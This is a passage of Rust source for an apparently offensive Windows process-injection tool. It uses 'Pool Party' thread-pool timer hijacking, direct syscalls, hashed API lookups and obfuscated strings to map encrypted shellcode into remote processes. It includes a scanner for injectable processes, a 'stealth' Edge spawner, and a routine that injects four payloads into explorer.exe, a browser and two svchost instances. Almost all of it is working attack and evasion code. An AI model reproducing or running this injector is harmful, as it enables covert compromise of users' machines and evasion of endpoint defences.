        &mut remote_addr,
        0,  // ZeroBits
        0,  // CommitSize
        null_mut(),  // SectionOffset
        &mut remote_view_size,
        VIEW_UNMAP,  // InheritDisposition
        0,  // AllocationType
        PAGE_EXECUTE_READ  // Win32Protect - executable for shellcode
    );

    if status != 0 {
        debug_println!("[-] Failed to map remote section: {:#x}", status);
        return status;
    }
    debug_println!("[+] Shellcode mapped at: {:?}", remote_addr);

    let create_timer_addr = unsafe { get_kernel32_export(CREATE_THREADPOOL_TIMER) };
    let alloc_timer_fn_addr = if create_timer_addr.is_some() {
        create_timer_addr.unwrap()
    } else {
        let tp_alloc_addr = unsafe { get_ntdll_export(TP_ALLOC_TIMER) };
        if tp_alloc_addr.is_none() {
            debug_println!("[-] Failed to resolve timer function");
            return -1;
        }
        tp_alloc_addr.unwrap()
    };

    let _set_timer_addr = unsafe { get_kernel32_export(SET_THREADPOOL_TIMER) };
    let _tp_set_timer_addr = if let Some(addr) = _set_timer_addr {
        addr
    } else {
        let tp_set_addr = unsafe { get_ntdll_export(TP_SET_TIMER) };
        if tp_set_addr.is_none() {
            debug_println!("[-] Failed to resolve timer set function");
            return -1;
        }
        tp_set_addr.unwrap()
    };

    let tp_alloc_timer: TpAllocTimerFn = unsafe { core::mem::transmute(alloc_timer_fn_addr) };
    let callback_ptr = remote_addr;

    let local_timer_ptr = unsafe {
        tp_alloc_timer(
            core::mem::transmute(callback_ptr),
            null_mut(),
            null_mut()
        )
    };

    if local_timer_ptr.is_null() {
        debug_println!("[-] TpAllocTimer failed");
        return -1;
    }
    debug_println!("[+] TP_TIMER created");

    let duplicated_wf_handle = unsafe { hijack_worker_factory_handle(process_handle) };
    let remote_tp_pool = if let Some(wf_handle) = duplicated_wf_handle {
        let mut wf_info: WORKER_FACTORY_BASIC_INFORMATION = unsafe { core::mem::zeroed() };
        let mut return_length: u32 = 0;

        let status = syscall!(
            NT_QUERY_INFORMATION_WORKER_FACTORY,
            NtQueryInformationWorkerFactoryFn,
            wf_handle,
            WORKER_FACTORY_BASIC_INFORMATION_CLASS,
            &mut wf_info as *mut _ as *mut c_void,
            core::mem::size_of::<WORKER_FACTORY_BASIC_INFORMATION>() as u32,
            &mut return_length
        );

        if status != 0 {
            core::ptr::null_mut()
        } else {
            debug_println!("[+] Worker Factory hijacked");
            wf_info.StartParameter
        }
    } else {
        core::ptr::null_mut()
    };

    let duplicated_timer_handle = unsafe { hijack_timer_handle(process_handle) };

    let local_timer = unsafe { &mut *(local_timer_ptr as *mut FULL_TP_TIMER) };
    let timeout: i64 = -10000000;

    if !remote_tp_pool.is_null() {
        local_timer.Work.CleanupGroupMember.Pool = remote_tp_pool as *mut FULL_TP_POOL;
    }

    local_timer.DueTime = timeout;
    local_timer.WindowStartLinks.Key = timeout;
    local_timer.WindowEndLinks.Key = timeout;

    let mut timer_remote_addr: *mut c_void = null_mut();
    let mut timer_region_size = core::mem::size_of::<FULL_TP_TIMER>();

    let status = syscall!(
        NT_ALLOCATE_VIRTUAL_MEMORY,
        NtAllocateVirtualMemoryFn,
        process_handle,
        &mut timer_remote_addr,
        0,
        &mut timer_region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if status != 0 {
        debug_println!("[-] Failed to allocate TP_TIMER: {:#x}", status);
        return status;
    }

    let remote_timer = timer_remote_addr as *mut FULL_TP_TIMER;

    unsafe {
        let remote_window_start_children = &mut (*remote_timer).WindowStartLinks.Children as *mut LIST_ENTRY;
        let remote_window_end_children = &mut (*remote_timer).WindowEndLinks.Children as *mut LIST_ENTRY;

        local_timer.WindowStartLinks.Children.Flink = remote_window_start_children;
        local_timer.WindowStartLinks.Children.Blink = remote_window_start_children;
        local_timer.WindowEndLinks.Children.Flink = remote_window_end_children;
        local_timer.WindowEndLinks.Children.Blink = remote_window_end_children;
    }

    let mut bytes_written: usize = 0;
    let status = syscall!(
        NT_WRITE_VIRTUAL_MEMORY,
        NtWriteVirtualMemoryFn,
        process_handle,
        timer_remote_addr,
        local_timer as *const _ as *const c_void,
        core::mem::size_of::<FULL_TP_TIMER>(),
        &mut bytes_written
    );

    if status != 0 {
        debug_println!("[-] Failed to write TP_TIMER: {:#x}", status);
        return status;
    }
    debug_println!("[+] TP_TIMER written ({} bytes)", bytes_written);

    if !remote_tp_pool.is_null() {
        let window_start_offset = core::mem::offset_of!(FULL_TP_POOL, TimerQueue)
            + core::mem::offset_of!(TP_TIMER_QUEUE, AbsoluteQueue)
            + core::mem::offset_of!(TP_TIMER_SUBQUEUE, WindowStart);
        let window_start_root_addr = (remote_tp_pool as usize + window_start_offset) as *mut *mut RTL_BALANCED_NODE;

        let timer_window_start_offset = core::mem::offset_of!(FULL_TP_TIMER, WindowStartLinks);
        let timer_window_start_ptr = (remote_timer as usize + timer_window_start_offset) as *mut TPP_PH_LINKS;

        let status = syscall!(
            NT_WRITE_VIRTUAL_MEMORY,
            NtWriteVirtualMemoryFn,
            process_handle,
            window_start_root_addr as *mut c_void,
            &timer_window_start_ptr as *const _ as *const c_void,
            core::mem::size_of::<*mut RTL_BALANCED_NODE>(),
            &mut bytes_written
        );

        if status == 0 {
            let window_end_offset = core::mem::offset_of!(FULL_TP_POOL, TimerQueue)
                + core::mem::offset_of!(TP_TIMER_QUEUE, AbsoluteQueue)
                + core::mem::offset_of!(TP_TIMER_SUBQUEUE, WindowEnd);
            let window_end_root_addr = (remote_tp_pool as usize + window_end_offset) as *mut *mut RTL_BALANCED_NODE;

            let timer_window_end_offset = core::mem::offset_of!(FULL_TP_TIMER, WindowEndLinks);
            let timer_window_end_ptr = (remote_timer as usize + timer_window_end_offset) as *mut TPP_PH_LINKS;

            let status = syscall!(
                NT_WRITE_VIRTUAL_MEMORY,
                NtWriteVirtualMemoryFn,
                process_handle,
                window_end_root_addr as *mut c_void,
                &timer_window_end_ptr as *const _ as *const c_void,
                core::mem::size_of::<*mut RTL_BALANCED_NODE>(),
                &mut bytes_written
            );

            if status == 0 {
                debug_println!("[+] Timer queue hijacked");
            }
        }
    }

    let timer_handle_to_set = if let Some(dup_handle) = duplicated_timer_handle {
        dup_handle
    } else {
        local_timer_ptr as isize
    };

    let due_time: i64 = -10000000;
    let t2_params = T2_SET_PARAMETERS {
        Version: 0,
        Reserved: 0,
        NoWakeTolerance: 0,
    };

    let status = syscall!(
        NT_SET_TIMER2,
        NtSetTimer2Fn,
        timer_handle_to_set,
        &due_time as *const i64,
        core::ptr::null(),
        &t2_params as *const T2_SET_PARAMETERS
    );

    if status == 0 {
        debug_println!("[+] Timer set - waiting for execution...");
        unsafe {
            let sleep_addr = get_kernel32_export(hash_it!("Sleep")).unwrap();
            let sleep_fn: extern "system" fn(u32) = core::mem::transmute(sleep_addr);
            sleep_fn(500);
        }
    } else {
        debug_println!("[-] NtSetTimer2 failed: {:#x}", status);
    }

    debug_println!("[+] Injection complete");
    0
}

/// Find all processes that have Worker Factory handles (suitable for Pool Party)
#[inline(never)]
pub unsafe fn find_processes_with_worker_factory() {
    debug_println!("\n=== Scanning for Processes with Worker Factory ===");

    let buffer_size: u32 = 1024 * 1024 * 2;
    let mut buffer = alloc::vec![0u8; buffer_size as usize];
    let mut return_length: u32 = 0;

    let status = syscall!(
        NT_QUERY_SYSTEM_INFORMATION,
        NtQuerySystemInformationFn,
        SYSTEM_HANDLE_INFORMATION_CLASS,
        buffer.as_mut_ptr() as *mut c_void,
        buffer_size,
        &mut return_length
    );

    if status != 0 {
        debug_println!("[-] NtQuerySystemInformation failed: {:#x}", status);
        return;
    }

    let handle_info = unsafe { &*(buffer.as_ptr() as *const SYSTEM_HANDLE_INFORMATION) };
    let num_handles = handle_info.NumberOfHandles;

    // Count Worker Factory handles per process
    let mut wf_by_process = alloc::collections::BTreeMap::new();

    let handles_ptr = &handle_info.Handles as *const SYSTEM_HANDLE_TABLE_ENTRY_INFO;
    for i in 0..num_handles as isize {
        let entry = unsafe { &*(handles_ptr.offset(i)) };

        if entry.ObjectTypeIndex == OBJECT_TYPE_WORKER_FACTORY as u8 {
            *wf_by_process.entry(entry.ProcessId as u32).or_insert(0) += 1;
        }
    }

    if wf_by_process.is_empty() {
        debug_println!("[-] No processes with Worker Factory handles found");
        return;
    }

    debug_println!("[+] Found {} processes with Worker Factory handles:", wf_by_process.len());

    for (pid, _count) in wf_by_process.iter() {
        // Try to get process name
        let _name = unsafe { find_process_name(*pid).unwrap_or_else(|| alloc::string::String::from("Unknown")) };
        debug_println!("    PID {}: {} Worker Factory handles - {}",
            pid, _count, _name);
    }

    debug_println!("\n[*] Tip: Target one of these processes for Pool Party injection!");
}

/// Helper to get process name from PID
unsafe fn find_process_name(target_pid: u32) -> Option<alloc::string::String> {
    let buffer_size = 1024 * 512;
    let mut buffer = alloc::vec![0u8; buffer_size];
    let mut return_length: u32 = 0;

    let status = syscall!(
        NT_QUERY_SYSTEM_INFORMATION,
        NtQuerySystemInformationFn,
        SYSTEM_PROCESS_INFORMATION_CLASS,
        buffer.as_mut_ptr() as *mut c_void,
        buffer_size as u32,
        &mut return_length
    );

    if status != 0 {
        return None;
    }

    let mut current_ptr = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

    loop {
        let current = unsafe { &*current_ptr };

        if current.UniqueProcessId as u32 == target_pid {
            if !current.ImageName.Buffer.is_null() && current.ImageName.Length > 0 {
                let name_len = (current.ImageName.Length / 2) as usize;
                let name_slice = unsafe { core::slice::from_raw_parts(
                    current.ImageName.Buffer,
                    name_len
                ) };

                let mut name_buf = alloc::vec![0u8; name_len];
                for (i, &c) in name_slice.iter().enumerate() {
                    name_buf[i] = if c < 128 { c as u8 } else { b'?' };
                }

                if let Ok(name) = core::str::from_utf8(&name_buf) {
                    return Some(alloc::string::String::from(name));
                }
            }
            return None;
        }

        if current.NextEntryOffset == 0 {
            break;
        }

        current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
    }

    None
}

/// Check if a process can be injected (has access and Worker Factory)
unsafe fn can_inject_process(pid: u32) -> bool {
    use core::ptr::null_mut;

    let mut process_handle: isize = 0;
    let mut client_id = CLIENT_ID {
        UniqueProcess: pid as *mut c_void,
        UniqueThread: null_mut(),
    };
    let mut obj_attr = OBJECT_ATTRIBUTES {
        Length: core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: null_mut(),
        ObjectName: null_mut(),
        Attributes: 0,
        SecurityDescriptor: null_mut(),
        SecurityQualityOfService: null_mut(),
    };

    let status = syscall!(
        NT_OPEN_PROCESS,
        NtOpenProcessFn,
        &mut process_handle,
        PROCESS_ALL_ACCESS,
        &mut obj_attr,
        &mut client_id
    );

    if status != 0 {
        return false;
    }

    // Check if process has Worker Factory
    let has_worker_factory = unsafe { hijack_worker_factory_handle(process_handle).is_some() };

    // Close handle
    let _ = syscall!(NT_CLOSE, NtCloseFn, process_handle);

    has_worker_factory
}


/// Find all PIDs for a specific process name that can be injected
#[inline(never)]
pub unsafe fn find_all_injectable_pids(process_name: &str, max_count: usize) -> alloc::vec::Vec<u32> {
    let mut pids = alloc::vec::Vec::new();
    let mut buffer_size: u32 = 1024 * 512;
    let mut buffer = alloc::vec![0u8; buffer_size as usize];
    let mut return_length: u32 = 0;

    let mut status = syscall!(
        NT_QUERY_SYSTEM_INFORMATION,
        NtQuerySystemInformationFn,
        SYSTEM_PROCESS_INFORMATION_CLASS,
        buffer.as_mut_ptr() as *mut c_void,
        buffer_size,
        &mut return_length
    );

    if status == 0xC0000004u32 as i32 {
        buffer_size = return_length + 4096;
        buffer = alloc::vec![0u8; buffer_size as usize];

        status = syscall!(
            NT_QUERY_SYSTEM_INFORMATION,
            NtQuerySystemInformationFn,
            SYSTEM_PROCESS_INFORMATION_CLASS,
            buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut return_length
        );
    }

    if status != 0 {
        return pids;
    }

    let mut current_ptr = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

    loop {
        let current = unsafe { &*current_ptr };

        if !current.ImageName.Buffer.is_null() && current.ImageName.Length > 0 {
            let name_len = (current.ImageName.Length / 2) as usize;
            let name_slice = unsafe {
                core::slice::from_raw_parts(
                    current.ImageName.Buffer,
                    name_len
                )
            };

            let mut name_buf = alloc::vec![0u8; name_len];
            for (i, &c) in name_slice.iter().enumerate() {
                name_buf[i] = if c < 128 { c as u8 } else { b'?' };
            }

            if let Ok(current_name) = core::str::from_utf8(&name_buf) {
                if current_name.eq_ignore_ascii_case(process_name) {
                    let candidate_pid = current.UniqueProcessId as u32;
                    if unsafe { can_inject_process(candidate_pid) } {
                        pids.push(candidate_pid);
                        if pids.len() >= max_count {
                            return pids;
                        }
                    }
                }
            }
        }

        if current.NextEntryOffset == 0 {
            break;
        }

        current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
    }

    pids
}


/// Spawn Microsoft Edge browser process using NtCreateUserProcess syscall
/// This demonstrates advanced process creation using native NT APIs for stealth
unsafe fn spawn_edge_process() -> Option<u32> {
    use core::ptr::null_mut;
    use core::mem::zeroed;

    debug_println!("[*] Attempting to spawn msedge.exe using NtCreateUserProcess...");

    // Edge paths to try (NT-style paths for native API)
    // Do not obf that string to help them understand the only string
    const EDGE_PATH: &str = "\\??\\C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";

    // Convert path to UTF-16 (proper conversion, not just byte-to-u16)
    // let mut path_utf16: alloc::vec::Vec<u16> = edge_path.encode_utf16().collect();
    // path_utf16.push(0); // null terminator
    let mut path_utf16 = utf16_str!(EDGE_PATH);

    // Create UNICODE_STRING for image path
    let mut image_path = UNICODE_STRING {
        Length: ((path_utf16.len() - 1) * 2) as u16,  // Length excludes null terminator
        MaximumLength: (path_utf16.len() * 2) as u16, // MaximumLength includes null terminator
        Buffer: path_utf16.as_mut_ptr(),
    };

    // Initialize UNICODE_STRING using RtlInitUnicodeString (important!)
    let rtl_init_unicode_addr = unsafe { get_ntdll_export(RTL_INIT_UNICODE_STRING) };
    if let Some(rtl_init_addr) = rtl_init_unicode_addr {
        let rtl_init_unicode: RtlInitUnicodeStringFn = unsafe { core::mem::transmute(rtl_init_addr) };
        unsafe { rtl_init_unicode(&mut image_path, path_utf16.as_ptr()) };
    }

    // Get RtlCreateProcessParametersEx from ntdll
    let rtl_create_params_addr = unsafe { get_ntdll_export(RTL_CREATE_PROCESS_PARAMETERS_EX) };
    if rtl_create_params_addr.is_none() {
        return None;
    }

    let rtl_create_params: RtlCreateProcessParametersExFn =
        unsafe { core::mem::transmute(rtl_create_params_addr.unwrap()) };

    // Create process parameters
    let mut process_params: *mut c_void = null_mut();
    const RTL_USER_PROCESS_PARAMETERS_NORMALIZED: u32 = 0x01;

    let status = unsafe {
        rtl_create_params(
            &mut process_params,
            &mut image_path,
            null_mut(), // DllPath
            null_mut(), // CurrentDirectory
            null_mut(), // CommandLine (null - use image path)
            null_mut(), // Environment
            null_mut(), // WindowTitle
            null_mut(), // DesktopInfo
            null_mut(), // ShellInfo
            null_mut(), // RuntimeData
            RTL_USER_PROCESS_PARAMETERS_NORMALIZED,
        )
    };

    if status != 0 {
        debug_println!("[-] RtlCreateProcessParametersEx failed: {:#x}", status);
        return None;
    }

    // Initialize PS_CREATE_INFO with correct state
    let mut create_info: PS_CREATE_INFO = PS_CREATE_INFO {
        Size: core::mem::size_of::<PS_CREATE_INFO>(),
        State: PS_CREATE_INITIAL_STATE,  // PsCreateInitialState = 0
        u: PS_CREATE_INFO_UNION { InitFlags: 0 }, // Initialize union to zero
    };

    // Allocate PS_ATTRIBUTE_LIST using NtAllocateVirtualMemory (like GitHub example)
    let attribute_list_size = core::mem::size_of::<PS_ATTRIBUTE_LIST>() + core::mem::size_of::<PS_ATTRIBUTE>();
    let mut attr_list: *mut PS_ATTRIBUTE_LIST = null_mut();
    let mut region_size: usize = attribute_list_size;

    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const PAGE_READWRITE: u32 = 0x04;

    let alloc_status = syscall!(
        NT_ALLOCATE_VIRTUAL_MEMORY,
        NtAllocateVirtualMemoryFn,
        -1isize, // Current process
        &mut attr_list as *mut *mut PS_ATTRIBUTE_LIST as *mut *mut c_void,
        0usize, // ZeroBits
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if alloc_status != 0 || attr_list.is_null() {
        debug_println!("[-] NtAllocateVirtualMemory for attribute list failed: {:#x}", alloc_status);
        return None;
    }

    // Initialize PS_ATTRIBUTE_LIST for image name (correct sizing)
    unsafe {
        (*attr_list).TotalLength = core::mem::size_of::<PS_ATTRIBUTE_LIST>(); // Just the struct size, not buffer
        (*attr_list).Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
        (*attr_list).Attributes[0].Size = image_path.Length as usize;
        (*attr_list).Attributes[0].Value = image_path.Buffer as usize;
        (*attr_list).Attributes[0].ReturnLength = null_mut();
    }

    // Call NtCreateUserProcess syscall
    let mut process_handle: isize = 0;
    let mut thread_handle: isize = 0;

    let status = syscall!(
        NT_CREATE_USER_PROCESS,
        NtCreateUserProcessFn,
        &mut process_handle,
        &mut thread_handle,
        PROCESS_ALL_ACCESS,
        PROCESS_ALL_ACCESS, // ThreadDesiredAccess
        null_mut(), // ProcessObjectAttributes
        null_mut(), // ThreadObjectAttributes
        0, // ProcessFlags (not suspended)
        0, // ThreadFlags (not suspended)
        process_params,
        &mut create_info,
        attr_list
    );

    if status == 0 {
        // Get PID from process handle using NtQueryInformationProcess
        #[repr(C)]
        struct PROCESS_BASIC_INFORMATION {
            ExitStatus: isize,
            PebBaseAddress: *mut c_void,
            AffinityMask: usize,
            BasePriority: i32,
            UniqueProcessId: usize,
            InheritedFromUniqueProcessId: usize,
        }

        let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
        let mut return_length: u32 = 0;

        const PROCESS_BASIC_INFORMATION_CLASS: u32 = 0;

        let query_status = syscall!(
            NT_QUERY_INFORMATION_PROCESS,
            NtQueryInformationProcessFn,
            process_handle,
            PROCESS_BASIC_INFORMATION_CLASS,
            &mut pbi as *mut _ as *mut c_void,
            core::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );

        let pid = if query_status == 0 {
            pbi.UniqueProcessId as u32
        } else {
            0
        };

        debug_println!("[+] Edge spawned successfully (PID: {})", pid);

        // Close handles
        let _ = syscall!(NT_CLOSE, NtCloseFn, process_handle);
        let _ = syscall!(NT_CLOSE, NtCloseFn, thread_handle);

        // Free allocated attribute list
        const MEM_RELEASE: u32 = 0x8000;
        let mut free_size: usize = 0;
        let _ = syscall!(
            NT_FREE_VIRTUAL_MEMORY,
            NtFreeVirtualMemoryFn,
            -1isize, // Current process
            &mut attr_list as *mut *mut PS_ATTRIBUTE_LIST as *mut *mut c_void,
            &mut free_size,
            MEM_RELEASE
        );

        // Wait for process to initialize (2 seconds)
        if let Some(sleep_addr) = unsafe { get_kernel32_export(hash_it!("Sleep")) } {
            let sleep_fn: extern "system" fn(u32) = unsafe { core::mem::transmute(sleep_addr) };
            sleep_fn(2000);
        }

        if pid != 0 {
            return Some(pid);
        }
    } else {
        debug_println!("[-] NtCreateUserProcess failed: {:#x}", status);

        // Free allocated attribute list on failure too
        const MEM_RELEASE: u32 = 0x8000;
        let mut free_size: usize = 0;
        let _ = syscall!(
            NT_FREE_VIRTUAL_MEMORY,
            NtFreeVirtualMemoryFn,
            -1isize, // Current process
            &mut attr_list as *mut *mut PS_ATTRIBUTE_LIST as *mut *mut c_void,
            &mut free_size,
            MEM_RELEASE
        );
    }

    debug_println!("[-] Failed to spawn Edge");
    None
}

/// Inject into multiple target processes with specific shellcodes for each
/// - explorer.exe gets file_shellcode
/// - browser (firefox/chrome/edge) gets com_shellcode
/// - svchost.exe #1 gets alarm_shellcode
/// - svchost.exe #2 gets pipe_master_shellcode
/// Shellcodes are RC4-encrypted and will be decrypted right before memcpy
#[inline(never)]
pub unsafe fn inject_multi_target<const N1: usize, const N2: usize, const N3: usize, const N4: usize>(
    file_shellcode: &crate::rc4::EncryptedBytes<N1>,       // for explorer.exe
    com_shellcode: &crate::rc4::EncryptedBytes<N2>,         // for browser
    alarm_shellcode: &crate::rc4::EncryptedBytes<N3>,       // for svchost #1
    pipe_master_shellcode: &crate::rc4::EncryptedBytes<N4>, // for svchost #2
) -> i32 {
    let mut injected_count = 0;

    debug_println!("\n=== Multi-Process Injection ===");
    debug_println!("[*] Target: 4 processes (explorer + browser + 2x injectable svchost)");

    // Find target PIDs
    let mut explorer_pid: Option<u32> = None;
    let mut browser_pid: Option<u32> = None;
    let mut svchost_pid1: Option<u32> = None;
    let mut svchost_pid2: Option<u32> = None;

    // 1. Try explorer.exe first
    let explorer_str= obfstr!("explorer.exe");
    if let Some(pid) = unsafe { find_process_by_name(explorer_str) } {
        if unsafe { can_inject_process(pid) } {
            debug_println!("[+] Found explorer.exe (PID: {}) - injectable", pid);
            explorer_pid = Some(pid);
        }
    }

    // 2. Try to find a browser
    let firefox = obfstr!("firefox.exe");
    let chrome = obfstr!("chrome.exe");
    let msedge = obfstr!("msedge.exe");
    let browsers = [firefox, chrome, msedge];
    for browser in &browsers {
        if let Some(pid) = unsafe { find_process_by_name(browser) } {
            if unsafe { can_inject_process(pid) } {
                debug_println!("[+] Found {} (PID: {}) - injectable", browser, pid);
                browser_pid = Some(pid);
                break;
            }
        }
    }

    // 3. If no browser found, spawn Edge
    if browser_pid.is_none() {
        debug_println!("[-] No running browser found");
        if let Some(pid) = unsafe { spawn_edge_process() } {
            if unsafe { can_inject_process(pid) } {
                debug_println!("[+] Spawned msedge.exe (PID: {}) - injectable", pid);
                browser_pid = Some(pid);
            }
        }
    }

    // 4. Find 2 svchost.exe processes
    debug_println!("[*] Looking for 2 injectable svchost.exe processes...");
    let svchost_str = obfstr!("svchost.exe");
    let svchost_pids = unsafe { find_all_injectable_pids(svchost_str, 2) };

    if svchost_pids.len() > 0 {
        debug_println!("[+] Found svchost.exe #1 (PID: {})", svchost_pids[0]);
        svchost_pid1 = Some(svchost_pids[0]);
    }
    if svchost_pids.len() > 1 {
        debug_println!("[+] Found svchost.exe #2 (PID: {})", svchost_pids[1]);
        svchost_pid2 = Some(svchost_pids[1]);
    }

    // Inject in reverse order of communication chain: file -> com -> pipe_master -> alarm
    debug_println!("\n[*] Injection order (reverse of communication chain):");
    debug_println!("    1. explorer.exe (file_shellcode)");
    debug_println!("    2. browser (com_shellcode)");
    debug_println!("    3. svchost #2 (pipe_master_shellcode)");
    debug_println!("    4. svchost #1 (alarm_shellcode)\n");

    // 1. Inject file_shellcode into explorer.exe
    if let Some(pid) = explorer_pid {
        debug_println!("[*] === Injection 1/4 - explorer.exe (PID: {}) ===", pid);
        let result = unsafe { inject_via_tp_timer(pid, file_shellcode) };
        if result == 0 {
            injected_count += 1;
            debug_println!("[+] Injection 1/4 successful\n");
        } else {
            debug_println!("[-] Injection 1/4 failed: {:#x}\n", result);
        }
    }

    // 2. Inject com_shellcode into browser
    if let Some(pid) = browser_pid {
        debug_println!("[*] === Injection 2/4 - browser (PID: {}) ===", pid);
        let result = unsafe { inject_via_tp_timer(pid, com_shellcode) };
        if result == 0 {
            injected_count += 1;
            debug_println!("[+] Injection 2/4 successful\n");
        } else {
            debug_println!("[-] Injection 2/4 failed: {:#x}\n", result);
        }
    }

    // 3. Inject pipe_master_shellcode into svchost #2
    if let Some(pid) = svchost_pid2 {
        debug_println!("[*] === Injection 3/4 - svchost #2 (PID: {}) ===", pid);
        let result = unsafe { inject_via_tp_timer(pid, pipe_master_shellcode) };
        if result == 0 {
            injected_count += 1;
            debug_println!("[+] Injection 3/4 successful\n");
        } else {
            debug_println!("[-] Injection 3/4 failed: {:#x}\n", result);
        }
    }

    // 4. Inject alarm_shellcode into svchost #1 (triggers the chain!)
    if let Some(pid) = svchost_pid1 {
        debug_println!("[*] === Injection 4/4 - svchost #1 (PID: {}) ===", pid);
        let result = unsafe { inject_via_tp_timer(pid, alarm_shellcode) };
        if result == 0 {
            injected_count += 1;
            debug_println!("[+] Injection 4/4 successful\n");
        } else {
            debug_println!("[-] Injection 4/4 failed: {:#x}\n", result);
        }
    }

    debug_println!("=== Multi-Process Injection Complete ===");
    debug_println!("[*] Successfully injected into {}/4 processes", injected_count);

    if injected_count > 0 { 0 } else { -1 }
}

// Find any injectable processes (excluding critical system processes and current process)
// pub unsafe fn find_any_injectable_pids(max_count: usize) -> alloc::vec::Vec<(u32, alloc::string::String)> {
//     let mut pids = alloc::vec::Vec::new();
//     let mut buffer_size: u32 = 1024 * 512;
//     let mut buffer = alloc::vec![0u8; buffer_size as usize];
//     let mut return_length: u32 = 0;

//     // Get current process ID to exclude it
//     // We use NtQueryInformationProcess on handle -1 (current process pseudo-handle)
//     #[repr(C)]
//     struct PROCESS_BASIC_INFORMATION {
//         ExitStatus: isize,
//         PebBaseAddress: *mut c_void,
//         AffinityMask: usize,
//         BasePriority: i32,
//         UniqueProcessId: usize,
//         InheritedFromUniqueProcessId: usize,
//     }

//     let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { core::mem::zeroed() };
//     let mut ret_len: u32 = 0;
//     const PROCESS_BASIC_INFORMATION_CLASS: u32 = 0;

//     let current_pid = unsafe {
//         let status = syscall!(
//             NT_QUERY_INFORMATION_PROCESS,
//             NtQueryInformationProcessFn,
//             -1isize, // Current process pseudo-handle
//             PROCESS_BASIC_INFORMATION_CLASS,
//             &mut pbi as *mut _ as *mut c_void,
//             core::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
//             &mut ret_len
//         );

//         if status == 0 {
//             pbi.UniqueProcessId as u32
//         } else {
//             0  // If we can't get it, just use 0 (won't match any real PID)
//         }
//     };

//     let mut status = syscall!(
//         NT_QUERY_SYSTEM_INFORMATION,
//         NtQuerySystemInformationFn,
//         SYSTEM_PROCESS_INFORMATION_CLASS,
//         buffer.as_mut_ptr() as *mut c_void,
//         buffer_size,
//         &mut return_length
//     );

//     if status == 0xC0000004u32 as i32 {
//         buffer_size = return_length + 4096;
//         buffer = alloc::vec![0u8; buffer_size as usize];

//         status = syscall!(
//             NT_QUERY_SYSTEM_INFORMATION,
//             NtQuerySystemInformationFn,
//             SYSTEM_PROCESS_INFORMATION_CLASS,
//             buffer.as_mut_ptr() as *mut c_void,
//             buffer_size,
//             &mut return_length
//         );
//     }

//     if status != 0 {
//         return pids;
//     }

//     // Obfuscated blacklist using obfstr! macro
//     let blacklist: &[&str] = &[
//         obfstr!("system"),
//         obfstr!("registry"),
//         obfstr!("smss.exe"),
//         obfstr!("csrss.exe"),
//         obfstr!("wininit.exe"),
//         obfstr!("services.exe"),
//         obfstr!("lsass.exe"),
//         obfstr!("winlogon.exe"),
//         obfstr!("dwm.exe"),
//         obfstr!("svchost.exe"),
//     ];

//     let mut current_ptr = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;

//     loop {
//         let current = unsafe { &*current_ptr };

//         if !current.ImageName.Buffer.is_null() && current.ImageName.Length > 0 {
//             let candidate_pid = current.UniqueProcessId as u32;

//             // Skip PID 0, 4 (System), and current process
//             if candidate_pid == current_pid || candidate_pid == 0 || candidate_pid == 4 {
//                 if current.NextEntryOffset == 0 {
//                     break;
//                 }
//                 current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
//                 continue;
//             }

//             let name_len = (current.ImageName.Length / 2) as usize;
//             let name_slice = unsafe {
//                 core::slice::from_raw_parts(current.ImageName.Buffer, name_len)
//             };

//             let mut name_buf = alloc::vec![0u8; name_len];
//             for (i, &c) in name_slice.iter().enumerate() {
//                 name_buf[i] = if c < 128 { c as u8 } else { b'?' };
//             }

//             if let Ok(current_name) = core::str::from_utf8(&name_buf) {
//                 let lowercase_name = current_name.to_lowercase();

//                 // Check against obfuscated blacklist
//                 let is_blacklisted = blacklist.iter().any(|&blacklisted_name| {
//                     lowercase_name.contains(blacklisted_name)
//                 });

//                 if !is_blacklisted && unsafe { can_inject_process(candidate_pid) } {
//                     use alloc::string::ToString;
//                     pids.push((candidate_pid, current_name.to_string()));
//                     if pids.len() >= max_count {
//                         return pids;
//                     }
//                 }
//             }
//         }

//         if current.NextEntryOffset == 0 {
//             break;
//         }

//         current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
//     }

//     pids
// }
